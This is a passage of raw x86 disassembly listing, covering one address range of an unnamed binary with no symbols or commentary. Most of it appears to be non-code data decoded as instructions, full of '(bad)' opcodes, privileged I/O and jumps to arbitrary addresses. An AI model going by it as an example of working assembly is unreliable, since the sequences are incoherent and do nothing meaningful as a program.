  413528:	inc    esp
  413529:	ds inc edx
  41352b:	dec    edi
  41352c:	(bad)  
  41352d:	ins    DWORD PTR es:[edi],dx
  41352e:	test   DWORD PTR [ebx],edi
  413530:	rol    DWORD PTR [edi],cl
  413532:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413533:	ss jae 0x4134b7
  413536:	es out dx,al
  413538:	pop    ss
  413539:	leave  
  41353a:	dec    ecx
  41353b:	(bad)
  41353e:	in     eax,0xc6
  413540:	xchg   edx,eax
  413541:	pop    ss
  413542:	test   al,0x91
  413544:	add    al,0x3d
  413546:	adc    DWORD PTR [eax],ebp
  413548:	pop    ecx
  413549:	jae    0x4135c9
  41354b:	jecxz  0x413515
  41354d:	xor    eax,eax
  41354f:	rcr    DWORD PTR [edi-0x3d],cl
  413552:	jbe    0x41358a
  413554:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413555:	inc    eax
  413556:	dec    edi
  413557:	jbe    0x41354b
  413559:	aad    0x9f
  41355b:	idiv   BYTE PTR [edx+0x1e94ba4]
  413561:	xchg   ebx,eax
  413562:	or     edi,DWORD PTR [edx+0x2cf3fbe5]
  413568:	cwde   
  413569:	inc    esp
  41356a:	fwait
  41356b:	icebp  
  41356c:	cmc    
  41356d:	je     0x4135d8
  41356f:	arpl   WORD PTR [edi],bp
  413571:	inc    esp
  413572:	mov    edi,0x1305aead
  413577:	mov    esi,0xf3d8932b
  41357c:	(bad)
  41357f:	add    eax,0x4c217dcf
  413584:	sub    esi,DWORD PTR [edi]
  413586:	adc    edi,DWORD PTR [ecx+0x52]
  413589:	rcr    edx,0x71
  41358c:	in     al,dx
  41358d:	(bad)
  413590:	fdiv   QWORD PTR [edi-0x145e2cc]
  413596:	sub    eax,0x3e704453
  41359b:	or     edi,ecx
  41359d:	repz and DWORD PTR [edx+0x59],0x32
  4135a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135a3:	retf   
  4135a4:	fcom   QWORD PTR [edx]
  4135a6:	push   es
  4135a7:	sub    ebx,DWORD PTR [ebx]
  4135a9:	sbb    al,0xc1
  4135ab:	out    dx,al
  4135ac:	inc    edx
  4135ad:	push   ebp
  4135ae:	enter  0x8ad3,0x58
  4135b2:	not    BYTE PTR [eax+0x4a]
  4135b5:	and    BYTE PTR [eax-0x2b31e335],bl
  4135bb:	add    DWORD PTR [edi+0x2],esp
  4135be:	fmul   DWORD PTR [ecx]
  4135c0:	xor    bl,BYTE PTR [edx-0x51]
  4135c3:	(bad)  
  4135c4:	mov    edx,0xbd99a6d4
  4135c9:	or     BYTE PTR [ecx],bl
  4135cb:	sub    eax,ebp
  4135cd:	and    DWORD PTR [eax],ebx
  4135cf:	pusha  
  4135d0:	ficom  WORD PTR [edx-0x4c]
  4135d3:	jl     0x41356c
  4135d5:	lds    eax,FWORD PTR [ebx+0x1f9b441a]
  4135db:	adc    DWORD PTR [esi-0x443d8da8],0xe9683908
  4135e5:	ret    0xd965
  4135e8:	adc    esp,edi
  4135ea:	sub    BYTE PTR [ebx-0x7d],0xca
  4135ee:	aas    
  4135ef:	cmp    BYTE PTR [edi],bl
  4135f1:	fadd   st,st(5)
  4135f3:	xor    eax,0x5016b6e9
  4135f8:	cmp    edx,ebp
  4135fa:	mov    ebp,DWORD PTR [eax-0x20]
  4135fd:	jmp    DWORD PTR [ecx]
  4135ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413600:	add    ecx,edx
  413602:	pop    eax
  413603:	xor    bh,al
  413605:	pop    ds
  413606:	neg    dl
  413608:	mov    dl,0xdf
  41360a:	dec    ebp
  41360b:	(bad)  
  41360c:	jo     0x413602
  41360e:	outs   dx,DWORD PTR ds:[esi]
  41360f:	test   al,0x47
  413611:	je     0x413659
  413613:	push   edx
  413614:	mov    al,0xc9
  413616:	pop    es
  413617:	xchg   ebp,eax
  413618:	and    eax,0x98e9
  41361d:	out    0xaf,al
  41361f:	fld1   
  413621:	je     0x413637
  413623:	hlt    
  413624:	mov    bl,0x8f
  413626:	lahf   
  413627:	pop    edx
  413628:	cmc    
  413629:	mov    esp,DWORD PTR [edx+edx*4-0x5b07e803]
  413630:	dec    edi
  413631:	cli    
  413632:	dec    esi
  413633:	out    dx,eax
  413634:	jl     0x413667
  413636:	mov    edx,0xd1541d68
  41363b:	lea    edx,[eax]
  41363d:	jmp    0xad661c5
  413642:	add    esp,DWORD PTR [eax+0x0]
  413645:	cwde   
  413646:	xchg   edi,eax
  413647:	jecxz  0x41367f
  413649:	dec    edx
  41364a:	mov    al,ds:0x267647be
  41364f:	add    dl,dh
  413651:	(bad)  
  413652:	iret   
  413653:	idiv   edx
  413655:	mov    ds,WORD PTR [ecx]
  413657:	jmp    0x4136a8
  413659:	pop    ds
  41365a:	sbb    eax,0xbfe8cf57
  41365f:	jge    0x4136a8
  413661:	data16 mov dh,0x41
  413664:	fisub  DWORD PTR ds:[esi-0x45e8e106]
  41366b:	test   ch,cl
  41366d:	jecxz  0x413651
  41366f:	test   eax,0x7ac6117
  413674:	clc    
  413675:	mov    bl,0xd3
  413677:	pop    edi
  413678:	xor    ebp,DWORD PTR [esi-0x51]
  41367b:	sub    eax,0x17524ede
  413680:	inc    eax
  413681:	and    eax,0x1e46114c
  413686:	sbb    DWORD PTR [esi-0x46ac29d1],ebp
  41368c:	(bad)  
  41368d:	retf   
  41368e:	lds    esp,FWORD PTR cs:[ebx-0x35]
  413692:	test   eax,0x87846b50
  413697:	(bad)  
  413698:	mov    ds:0xc3f07810,eax
  41369d:	add    esp,DWORD PTR [ebx-0x162bb6ec]
  4136a3:	sub    eax,0xd961d1d6
  4136a8:	mov    ds:0x92c05c42,al
  4136ad:	jle    0x41365f
  4136af:	or     eax,0x1508b910
  4136b4:	loop   0x4136ab
  4136b6:	pop    eax
  4136b7:	jp     0x41368b
  4136b9:	mov    ah,0x37
  4136bb:	and    BYTE PTR [ecx+0x3c3abdc],bh
  4136c1:	clc    
  4136c2:	sbb    DWORD PTR [eax-0xe],ecx
  4136c5:	pusha  
  4136c6:	inc    esi
  4136c7:	or     BYTE PTR [esi-0x6a],bh
  4136ca:	lods   al,BYTE PTR ds:[esi]
  4136cb:	(bad)  
  4136cc:	enter  0x4803,0xa6
  4136d0:	ficomp WORD PTR [eax]
  4136d2:	scas   al,BYTE PTR es:[edi]
  4136d3:	xchg   BYTE PTR [esi],bl
  4136d5:	sti    
  4136d6:	xchg   BYTE PTR [esi+0x3],bl
  4136d9:	popf   
  4136da:	jbe    0x41373f
  4136dc:	pop    edi
  4136dd:	clc    
  4136de:	cmp    eax,DWORD PTR [ecx]
  4136e0:	popf   
  4136e1:	jns    0x413693
  4136e3:	mov    ch,0x76
  4136e5:	bound  esi,QWORD PTR [ebp-0x1d]
  4136e8:	ret    0x38a6
  4136eb:	mov    ah,0x7b
  4136ed:	ror    BYTE PTR [edi-0x73d7b9ed],0x24
  4136f4:	ror    ecx,0x6f
  4136f7:	clc    
  4136f8:	pop    ebp
  4136f9:	sub    al,0x21
  4136fb:	stos   DWORD PTR es:[edi],eax
  4136fc:	mov    BYTE PTR [ecx],bl
  4136fe:	push   ecx
  4136ff:	mov    eax,0x47f848c8
  413704:	cmc    
  413705:	(bad)  
  413707:	lods   al,BYTE PTR ds:[esi]
  413708:	sub    eax,0xfece50f5
  41370d:	test   al,0x71
  41370f:	and    DWORD PTR [eax],ebx
  413711:	popa   
  413712:	lea    esi,[edx+0x5a]
  413715:	xor    eax,0x518e34f3
  41371a:	xchg   ecx,eax
  41371b:	js     0x413769
  41371d:	mov    BYTE PTR [edi+0x5e],ch
  413720:	and    DWORD PTR [edi],esi
  413722:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413723:	jp     0x413760
  413725:	push   0xffffffae
  413727:	loop   0x41370c
  413729:	mov    esi,0xad708e01
  41372e:	pop    ecx
  41372f:	outs   dx,DWORD PTR ds:[esi]
  413730:	cmp    dl,BYTE PTR [edi-0x26ed590e]
  413736:	test   eax,0x5682a455
  41373b:	pop    edi
  41373c:	cmp    eax,0xb22cb5f0
  413741:	outs   dx,DWORD PTR ds:[esi]
  413742:	jns    0x413778
  413744:	pop    ecx
  413745:	test   DWORD PTR [edx+0x4aec47c7],edx
  41374b:	data16 jle 0x413763
  41374e:	mov    ds:0xaeb934fa,eax
  413753:	fcmovbe st,st(1)
  413755:	inc    edi
  413756:	push   ds
  413757:	fistp  WORD PTR [edx]
  413759:	and    eax,0x750daea0
  41375e:	cmp    BYTE PTR [edx-0x1723498f],cl
  413764:	mov    ebp,0xe7388916
  413769:	add    DWORD PTR [ecx],ebp
  41376b:	pop    ecx
  41376c:	adc    DWORD PTR ds:0x37e09d37,esp
  413772:	jp     0x4137c4
  413774:	lea    ecx,[ecx+0xf409777]
  41377a:	fnstcw WORD PTR [edi+0x2596a15c]
  413780:	sbb    al,0x1e
  413782:	and    DWORD PTR [ebx-0x76cd0afc],edi
  413788:	mov    BYTE PTR [esi],al
  41378a:	pop    ds
  41378b:	sub    eax,0xf12c7943
  413790:	aam    0x2e
  413792:	int3   
  413793:	jae    0x41371f
  413795:	jbe    0x4137d5
  413797:	adc    cl,BYTE PTR [edx+0x6a]
  41379a:	mov    ds:0x4c2df94a,al
  41379f:	rcl    dh,1
  4137a1:	dec    esp
  4137a2:	dec    ecx
  4137a3:	add    eax,0x8b3b4d2b
  4137a8:	lods   al,BYTE PTR ds:[esi]
  4137a9:	or     al,0x29
  4137ab:	jg     0x413753
  4137ad:	fcmovu st,st(0)
  4137af:	scas   eax,DWORD PTR es:[edi]
  4137b0:	cmp    BYTE PTR [eax],bh
  4137b2:	add    dl,BYTE PTR [ebp+0x3b]
  4137b5:	fwait
  4137b6:	clc    
  4137b7:	ror    BYTE PTR [ebp-0x62462407],1
  4137bd:	leave  
  4137be:	in     al,dx
  4137bf:	fnstsw WORD PTR [ecx]
  4137c1:	stc    
  4137c2:	neg    BYTE PTR [ebx-0x7]
  4137c5:	sbb    eax,DWORD PTR [ebp-0x59]
  4137c8:	scas   eax,DWORD PTR es:[edi]
  4137c9:	or     BYTE PTR [ebx],dh
  4137cb:	cmp    bl,BYTE PTR [edx+0x6d93584]
  4137d1:	lahf   
  4137d2:	jnp    0x41375a
  4137d4:	fs mov ecx,0x9a89222a
  4137da:	add    DWORD PTR [eax-0x44],0xffffffa9
  4137de:	jecxz  0x4137ea
  4137e0:	jmp    0xec19:0xb04c4dc3
  4137e7:	popf   
  4137e8:	dec    edx
  4137e9:	sar    DWORD PTR ds:0x35defd21,0xec
  4137f0:	cld    
  4137f1:	dec    ebx
  4137f2:	push   ecx
  4137f3:	push   ss
  4137f4:	xchg   edi,eax
  4137f5:	pushf  
  4137f6:	jae    0x41377c
  4137f8:	out    0x88,al
  4137fa:	aad    0x4
  4137fc:	ret    
  4137fd:	pop    esi
  4137fe:	nop
  4137ff:	cwde   
  413800:	aas    
  413801:	es push es
  413803:	loope  0x413846
  413805:	aad    0xb4
  413807:	mov    bl,0xe8
  413809:	outs   dx,DWORD PTR ds:[esi]
  41380a:	inc    edi
  41380b:	sub    BYTE PTR [ecx],cl
  41380d:	cmp    ebx,ebx
  41380f:	das    
  413810:	repnz xchg edi,eax
  413812:	and    eax,0x4084bf9d
  413817:	into   
  413818:	js     0x41383e
  41381a:	(bad)  
  41381b:	push   ds
  41381c:	mov    edx,0x6a1004b3
  413821:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413822:	sbb    bh,BYTE PTR ds:0x3dea272a
  413828:	push   0x72
  41382a:	lahf   
  41382b:	shl    DWORD PTR [ebx+0xcd6e4f9],0xd3
  413832:	sar    DWORD PTR [ebx],cl
  413834:	sbb    DWORD PTR [ebp-0x784b94dc],0x18fb763c
  41383e:	inc    edx
  41383f:	mov    eax,0x7ee29584
  413844:	or     al,0x61
  413846:	inc    edx
  413847:	mov    ch,0x46
  413849:	or     al,0xdb
  41384b:	aad    0x5
  41384d:	adc    al,BYTE PTR [edi+0x43]
  413850:	call   0x5c76b02d
  413855:	jle    0x4137e8
  413857:	lds    ecx,FWORD PTR [edi]
  413859:	scas   al,BYTE PTR es:[edi]
  41385a:	and    esi,DWORD PTR [ebx+eiz*1+0x4a]
  41385e:	and    ah,ch
  413860:	mov    ds:0xb7aba0ae,eax
  413865:	or     ebx,DWORD PTR fs:[edx+0x7b6178eb]
  41386c:	jae    0x413816
  41386e:	(bad)  
  41386f:	push   ds
  413870:	popf   
  413871:	mov    ch,0xc6
  413873:	jp     0x4138b1
  413875:	jmp    0x445503cf
  41387a:	adc    ch,bh
  41387c:	popf   
  41387d:	sub    edi,DWORD PTR [edi-0x5f]
  413880:	jo     0x4138ea
  413882:	xchg   ebp,eax
  413883:	int    0xd8
  413885:	aas    
  413886:	into   
  413887:	ja     0x4138a1
  413889:	pop    es
  41388a:	push   esp
  41388b:	mov    dh,0xd6
  41388d:	js     0x413904
  41388f:	and    eax,ebp
  413891:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413892:	jl     0x4138eb
  413894:	(bad)  
  413895:	sbb    DWORD PTR [esi],edi
  413897:	loope  0x4138ef
  413899:	sub    eax,0xc25af8f6
  41389e:	test   BYTE PTR [eax],al
  4138a0:	ins    BYTE PTR es:[edi],dx
  4138a1:	pop    ebx
  4138a2:	je     0x4138ae
  4138a4:	mov    ah,0xc1
  4138a6:	(bad)  
  4138a7:	repz dec eax
  4138a9:	mov    ah,0x78
  4138ab:	xchg   edi,eax
  4138ac:	pusha  
  4138ad:	jae    0x413916
  4138af:	popa   
  4138b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138b1:	add    esp,0xfffffffe
  4138b4:	adc    al,0x80
  4138b6:	and    al,0x41
  4138b8:	pop    eax
  4138b9:	sub    al,0x69
  4138bb:	adc    edi,eax
  4138bd:	jge    0x4138a2
  4138bf:	sbb    ch,BYTE PTR [edx+edi*1-0x3c79cab2]
  4138c6:	sbb    BYTE PTR [edx+0x2aeca7c4],bl
  4138cc:	push   0xffffff96
  4138ce:	(bad)  
  4138cf:	xchg   ecx,eax
  4138d0:	mov    ds:0x6e973a37,eax
  4138d5:	dec    edi
  4138d6:	dec    ecx
  4138d7:	xchg   ecx,eax
  4138d8:	adc    bh,ch
  4138da:	adc    dl,ch
  4138dc:	daa    
  4138dd:	sbb    eax,0xd088b660
  4138e2:	push   ss
  4138e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138e4:	dec    esi
  4138e5:	mov    ds:0x97cf43a9,eax
  4138ea:	shl    DWORD PTR [ecx],0xe0
  4138ed:	mov    ds,edi
  4138ef:	stos   BYTE PTR es:[edi],al
  4138f0:	fsubr  st(7),st
  4138f2:	jmp    0x3405:0x702c4232
  4138f9:	stos   BYTE PTR es:[edi],al
  4138fa:	sti    
  4138fb:	push   ss
  4138fc:	sbb    eax,0x13a78692
  413901:	mov    eax,ds:0x220bcc43
  413906:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413907:	aas    
  413908:	scas   eax,DWORD PTR es:[edi]
  413909:	out    dx,al
  41390a:	out    dx,eax
  41390b:	pop    eax
  41390c:	inc    BYTE PTR ds:0x8b3c769a
  413912:	enter  0x5545,0x5a
  413916:	push   ebx
  413917:	mov    esi,DWORD PTR [esi]
  413919:	mov    eax,ds:0x41606ec9
  41391e:	bound  edx,QWORD PTR [ecx]
  413920:	or     dh,bl
  413922:	mov    cl,0xc8
  413924:	ret    
  413925:	push   ds
  413926:	adc    DWORD PTR [ebx+0x6c],ebp
  413929:	add    DWORD PTR [ecx+edi*1-0x12],eax
  41392d:	add    bh,bh
  41392f:	pop    ss
  413930:	push   es
  413931:	shr    bl,0xc1
  413934:	pop    esi
  413935:	(bad)  
  413936:	mov    bh,0xb3
  413938:	inc    edi
  413939:	lods   eax,DWORD PTR ds:[esi]
  41393a:	outs   dx,DWORD PTR ds:[esi]
  41393b:	xor    al,0x6b
  41393d:	sub    esi,DWORD PTR [edx+0x601d25ae]
  413943:	(bad)  
  413944:	cmp    cl,bh
  413946:	dec    ebx
  413947:	cdq    
  413948:	jo     0x4138dc
  41394a:	stos   BYTE PTR es:[edi],al
  41394b:	jp     0x413981
  41394d:	mov    dl,0xff
  41394f:	stos   DWORD PTR es:[edi],eax
  413950:	xchg   edi,eax
  413951:	mov    ch,0xbd
  413953:	jp     0x41399b
  413955:	jbe    0x413984
  413957:	pop    ss
  413958:	push   edx
  413959:	in     al,0xb8
  41395b:	and    eax,0x32c831e2
  413960:	(bad)  
  413962:	inc    ebx
  413963:	jp     0x41398b
  413965:	mov    edi,0xe0d89125
  41396a:	xor    ecx,0x47
  41396d:	fsubr  DWORD PTR [ebp+0x38c96fdf]
  413973:	and    DWORD PTR [esi+0x7461255a],0x9d3a0a76
  41397d:	jmp    0x41391c
  41397f:	ins    DWORD PTR es:[edi],dx
  413980:	mov    ebx,0xc4894a11
  413985:	inc    ebx
  413986:	inc    esp
  413987:	mov    ecx,0xf75ecee
  41398c:	pop    ebx
  41398d:	ror    BYTE PTR [ebx],cl
  41398f:	jl     0x4139f2
  413991:	pop    ss
  413992:	sub    al,0x41
  413994:	loop   0x413931
  413996:	aad    0x64
  413998:	push   ss
  413999:	and    DWORD PTR [eax-0x3f],esp
  41399c:	aad    0x76
  41399e:	add    eax,0x1c7316
  4139a3:	ds mov ecx,0xfa5e2c8a
  4139a9:	inc    ebx
  4139aa:	inc    eax
  4139ab:	loop   0x41399f
  4139ad:	mov    WORD PTR [ebp+0x7e],ds
  4139b0:	imul   ebx,DWORD PTR [ebx-0x7f],0xffffffb7
  4139b4:	push   ds
  4139b5:	or     bh,BYTE PTR [ebx+0x52]
  4139b8:	mov    eax,fs:0x5213de64
  4139be:	nop
  4139bf:	mov    bh,0xc3
  4139c1:	outs   dx,BYTE PTR ds:[esi]
  4139c2:	mov    BYTE PTR [ebx],bl
  4139c4:	aam    0x66
  4139c6:	dec    eax
  4139c7:	pop    esp
  4139c8:	popf   
  4139c9:	sub    BYTE PTR [edi+0x5560ddc5],cl
  4139cf:	xor    esp,DWORD PTR [eax+0x61ddbc38]
  4139d5:	int3   
  4139d6:	(bad)  
  4139d7:	sbb    eax,0xe07e4f87
  4139dc:	adc    DWORD PTR [ebx],ebp
  4139de:	repz mov dh,0xfb
  4139e1:	lahf   
  4139e2:	mov    al,ds:0x6825684d
  4139e7:	jns    0x4139f4
  4139e9:	pop    ebx
  4139ea:	hlt    
  4139eb:	jecxz  0x413a0c
  4139ed:	sub    ah,al
  4139ef:	xchg   esi,eax
  4139f0:	sub    bh,BYTE PTR [edi+0x6689e805]
  4139f6:	mov    eax,DWORD PTR [edi+esi*4]
  4139f9:	add    al,0x6d
  4139fb:	inc    ebp
  4139fc:	lea    eax,[esi-0x12]
  4139ff:	(bad)
  413a03:	mov    edx,0x90f4d7a5
  413a08:	shl    DWORD PTR [edi-0x708eceab],cl
  413a0e:	pop    esi
  413a0f:	inc    eax
  413a10:	aad    0x42
  413a12:	stos   BYTE PTR es:[edi],al
  413a13:	and    DWORD PTR [esi+esi*4+0x33b4975c],edi
  413a1a:	pop    ebx
  413a1b:	mov    edx,0xed72cb99
  413a20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a21:	jge    0x413a44
  413a23:	jo     0x413a40
  413a25:	mov    eax,ecx
  413a27:	dec    eax
  413a28:	xchg   ecx,eax
  413a29:	lds    esp,FWORD PTR [ebx+0x766ba3e7]
  413a2f:	xchg   ebp,eax
  413a30:	cli    
  413a31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a32:	push   ecx
  413a33:	sbb    BYTE PTR [esi+0x17c913b1],bl
  413a39:	cmp    ebx,DWORD PTR [esi+0x4d5b7e49]
  413a3f:	fist   WORD PTR [edx]
  413a41:	inc    eax
  413a42:	sbb    esi,DWORD PTR ds:0xdc1dcbec
  413a48:	frstor [ebx]
  413a4a:	jmp    FWORD PTR [edi]
  413a4c:	mov    al,ds:0x977fa51d
  413a51:	mov    eax,ds:0x72e880be
  413a56:	inc    ecx
  413a57:	mov    esp,DWORD PTR [edx-0x73]
  413a5a:	push   ss
  413a5b:	jmp    0xa1cd1de2
  413a60:	pop    ss
  413a61:	add    BYTE PTR [ecx-0x4d],dh
  413a64:	dec    ebx
  413a65:	(bad)  
  413a66:	cdq    
  413a67:	(bad)  [eax+0x32]
  413a6a:	js     0x413a09
  413a6c:	cs and bl,ch
  413a6f:	or     bh,bh
  413a71:	jnp    0x413a64
  413a73:	push   esi
  413a74:	add    eax,0x49b96dbb
  413a79:	icebp  
  413a7a:	and    eax,0x75567b05
  413a7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a80:	fldcw  WORD PTR [edx-0x1c391512]
  413a86:	xor    eax,0x62c1076c
  413a8b:	fs sbb eax,0x67d3f55d
  413a91:	jge    0x413ac5
  413a93:	jle    0x413ae9
  413a95:	sub    ecx,DWORD PTR [edi]
  413a97:	sub    ecx,eax
  413a99:	ins    DWORD PTR es:[edi],dx
  413a9a:	stos   BYTE PTR es:[edi],al
  413a9b:	cdq    
  413a9c:	xor    bh,BYTE PTR [eax+0xb5721ae]
  413aa2:	mov    bh,0xcc
  413aa4:	pusha  
  413aa5:	dec    ecx
  413aa6:	fs or  eax,0xefd0da31
  413aac:	pop    esp
  413aad:	mov    ds:0xf11ad2d2,eax
  413ab2:	push   ebx
  413ab3:	push   edx
  413ab4:	sti    
  413ab5:	jp     0x413b0d
  413ab7:	pop    ds
  413ab8:	inc    ecx
  413ab9:	arpl   WORD PTR [ebx-0x7414cf61],bp
  413abf:	popa   
  413ac0:	in     eax,dx
  413ac1:	aas    
  413ac2:	cmp    al,0xe9
  413ac4:	sbb    DWORD PTR [ebx-0x3f],ebx
  413ac7:	sti    
  413ac8:	mov    edx,DWORD PTR [edx+0x35d1b0f5]
  413ace:	mov    ds:0x737ef48,al
  413ad3:	inc    ebp
  413ad4:	sti    
  413ad5:	adc    DWORD PTR [edx-0x10],esi
  413ad8:	(bad)  
  413ad9:	mov    edi,0x9c117d58
  413ade:	or     BYTE PTR [edx-0x75],0x5f
  413ae2:	mov    cl,0x7d
  413ae4:	jge    0x413ad1
  413ae6:	lods   al,BYTE PTR ds:[esi]
  413ae7:	scas   al,BYTE PTR es:[edi]
  413ae8:	outs   dx,BYTE PTR ds:[esi]
  413ae9:	das    
  413aea:	arpl   WORD PTR ds:0x352328eb,cx
  413af0:	in     al,dx
  413af1:	mov    esi,0x42bfc27e
  413af6:	sbb    al,0x3c
  413af8:	mov    al,0x6d
  413afa:	xor    DWORD PTR [eax+0x75],ebp
  413afd:	in     eax,dx
  413afe:	popa   
  413aff:	jbe    0x413ae5
  413b01:	xor    dh,BYTE PTR [ebx-0x52]
  413b04:	cwde   
  413b05:	adc    al,0x0
  413b07:	leave  
  413b08:	jp     0x413b14
  413b0a:	int3   
  413b0b:	ret    0x8bc0
  413b0e:	mov    cl,0x7d
  413b10:	sbb    edx,DWORD PTR [ebx-0x3f3796d1]
  413b16:	xchg   esp,eax
  413b17:	or     dh,al
  413b19:	fcmovne st,st(2)
  413b1b:	mov    ebx,0xb4434bc6
  413b20:	push   edx
  413b21:	bound  edi,QWORD PTR [ebx-0x73b69499]
  413b27:	adc    al,0x42
  413b29:	or     eax,0x12803e3
  413b2e:	inc    ecx
  413b2f:	nop
  413b30:	or     eax,0x126309bb
  413b35:	dec    esp
  413b36:	mov    esi,0x62d65fac
  413b3b:	dec    edi
  413b3c:	inc    edi
  413b3d:	imul   esp,DWORD PTR [esi+0x57],0xcd82f49b
  413b44:	into   
  413b45:	pop    edx
  413b46:	sbb    bl,BYTE PTR [ebx+0x2a]
  413b49:	and    esp,edi
  413b4b:	fcom   st(5)
  413b4d:	and    ebp,ebx
  413b4f:	inc    ebp
  413b50:	xchg   ebp,eax
  413b51:	pop    ebp
  413b52:	mov    cl,0xe0
  413b54:	xchg   edx,eax
  413b55:	retf   
  413b56:	mov    edi,DWORD PTR [esi]
  413b58:	dec    ebp
  413b59:	iret   
  413b5a:	lods   al,BYTE PTR ds:[esi]
  413b5b:	out    0xc9,al
  413b5d:	(bad)  
  413b5e:	or     eax,0x2d18cfd0
  413b63:	sub    cl,cl
  413b65:	xor    al,0x82
  413b67:	push   eax
  413b68:	or     BYTE PTR [esi+0x5db2361b],al
  413b6e:	(bad)
  413b72:	pop    ecx
  413b73:	adc    cl,BYTE PTR [eax]
  413b75:	(bad)  
  413b77:	iret   
  413b78:	fdivr  QWORD PTR [edx+0x5cfa7b1d]
  413b7e:	or     al,0xe7
  413b80:	ja     0x413b08
  413b82:	xor    esp,DWORD PTR [ebp+edx*1+0x46]
  413b86:	(bad)  
  413b87:	mov    esi,0x563d2555
  413b8c:	xor    BYTE PTR [ecx-0x7f],0x89
  413b90:	(bad)  
  413b91:	jge    0x413b97
  413b93:	ret    
  413b94:	dec    ecx
  413b95:	or     esp,DWORD PTR [ebp+0x112fe7c6]
  413b9b:	sar    al,0x7e
  413b9e:	cmc    
  413b9f:	mov    bl,0xe5
  413ba1:	cdq    
  413ba2:	inc    edi
  413ba3:	jp     0x413be7
  413ba5:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ba7:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  413ba9:	xchg   edx,eax
  413baa:	je     0x413c17
  413bac:	dec    ebp
  413bad:	outs   dx,BYTE PTR ds:[esi]
  413bae:	jns    0x413bb7
  413bb0:	fist   WORD PTR [ebx-0x7d]
  413bb3:	enter  0xc33d,0xf1
  413bb7:	cdq    
  413bb8:	push   ecx
  413bb9:	adc    eax,0x3849b45e
  413bbe:	sbb    eax,0x65cd8ace
  413bc3:	xchg   ebp,eax
  413bc4:	iret   
  413bc5:	mov    eax,ds:0xc8ef67a
  413bca:	fwait
  413bcb:	pop    edi
  413bcc:	repnz mov dh,ch
  413bcf:	pop    DWORD PTR [edi+esi*4]
  413bd2:	mov    WORD PTR [eax+eiz*8],?
  413bd5:	lods   eax,DWORD PTR ds:[esi]
  413bd6:	shl    DWORD PTR [ecx],cl
  413bd8:	add    ecx,ebx
  413bda:	dec    eax
  413bdb:	mov    dh,0x11
  413bdd:	pushf  
  413bde:	mov    ds:0xa9dede75,eax
  413be3:	fistp  WORD PTR [ebp-0x3b]
  413be6:	or     ebx,ebx
  413be8:	in     al,0x3f
  413bea:	mov    edx,0xf6e813a1
  413bef:	data16 mov cr5,ebp
  413bf3:	mov    al,0x9e
  413bf5:	dec    esp
  413bf6:	inc    ecx
  413bf7:	sub    ah,BYTE PTR [eax]
  413bf9:	sahf   
  413bfa:	shl    esi,cl
  413bfc:	cmp    ecx,ecx
  413bfe:	mov    esi,0x5d4c7243
  413c03:	test   eax,0x472290cb
  413c08:	cmp    eax,0xa6ca1ac9
  413c0d:	dec    esp
  413c0e:	push   ss
  413c0f:	bound  ebp,QWORD PTR [eax+0x4c]
  413c12:	mov    ebx,0xdc951d24
  413c17:	mov    edx,DWORD PTR [edx-0x3b]
  413c1a:	sbb    bl,BYTE PTR ds:[ebx+edi*4]
  413c1e:	sbb    DWORD PTR [ebx],esi
  413c20:	mov    esi,0xd2ddbf65
  413c25:	sbb    esp,DWORD PTR [esi-0x19877f3b]
  413c2b:	pop    es
  413c2c:	ins    BYTE PTR es:[edi],dx
  413c2d:	sbb    al,0xc3
  413c2f:	loop   0x413c7d
  413c31:	out    dx,eax
  413c32:	sbb    DWORD PTR [ebp+0x4dfae74a],ebp
  413c38:	arpl   WORD PTR [edx+edx*4+0x3a],di
  413c3c:	(bad)  
  413c3d:	mov    WORD PTR [ecx],es
  413c3f:	clc    
  413c40:	mov    esi,0xc2bbbcb
  413c45:	push   es
  413c46:	out    dx,eax
  413c47:	adc    BYTE PTR [eax],al
  413c49:	fwait
  413c4a:	add    dl,bl
  413c4c:	sbb    BYTE PTR [esp+esi*4],0xb1
  413c50:	gs test al,bh
  413c53:	(bad)  
  413c54:	jp     0x413c10
  413c56:	inc    edi
  413c57:	inc    esp
  413c58:	addr16 clc 
  413c5a:	sub    eax,0x2d68b2c4
  413c5f:	ror    BYTE PTR [edx+0x13],1
  413c62:	test   eax,0x242129e4
  413c67:	in     eax,0xb1
  413c69:	iret   
  413c6a:	sbb    al,0x3f
  413c6c:	xrelease mov DWORD PTR [ebx],esp
  413c6f:	mov    ah,0x36
  413c71:	leave  
  413c72:	xchg   edi,eax
  413c73:	int3   
  413c74:	jns    0x413c5a
  413c76:	sahf   
  413c77:	std    
  413c78:	pop    ds
  413c79:	dec    esp
  413c7a:	pusha  
  413c7b:	iret   
  413c7c:	xor    bh,BYTE PTR [edx+edx*8]
  413c7f:	push   0xa14a6271
  413c84:	shr    BYTE PTR [ebx-0x62],cl
  413c87:	push   ecx
  413c88:	aad    0xe3
  413c8a:	mov    ds:0xefbe27eb,al
  413c8f:	test   al,0x41
  413c91:	cmp    al,0x4f
  413c93:	xchg   edi,eax
  413c94:	push   esi
  413c95:	or     DWORD PTR [eax+eax*8],esp
  413c98:	xor    al,0x32
  413c9a:	imul   ebp,eax,0x7dca3fe9
  413ca0:	push   ebp
  413ca1:	lods   eax,DWORD PTR ds:[esi]
  413ca2:	jmp    0xf01f3c4f
  413ca7:	jmp    0xa7b270f2
  413cac:	dec    ebx
  413cad:	jmp    0x413d1f
  413caf:	inc    ebx
  413cb0:	out    0x76,eax
  413cb2:	in     eax,dx
  413cb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413cb4:	sbb    esi,DWORD PTR [esi]
  413cb6:	in     al,dx
  413cb7:	mov    ebx,0x69b4d4ef
  413cbc:	(bad)  
  413cbd:	jl     0x413ccc
